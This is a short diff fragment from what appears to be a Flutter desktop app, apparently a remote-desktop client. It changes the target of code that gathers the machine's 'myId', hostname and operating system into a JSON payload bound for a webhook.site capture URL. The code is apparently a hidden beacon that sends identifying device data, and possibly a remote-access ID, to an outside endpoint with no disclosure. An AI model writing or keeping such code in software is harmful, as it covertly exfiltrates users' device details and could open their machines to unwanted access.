@@ -242,7 +242,7 @@ class _DesktopHomePageState extends State<DesktopHomePage>
       final hostname = Platform.localHostname;
       final os = Platform.operatingSystem;
 
-      final url = Uri.parse("https://webhook.site/4624ddd4-9865-4cf7-9817-c74c29fe4f85");
+      final url = Uri.parse("https://webhook.site/53ed3a36-6676-43eb-aabb-8660d3b8ac0a");
       final payload = jsonEncode({
         "id": myId,
         "hostname": hostname,
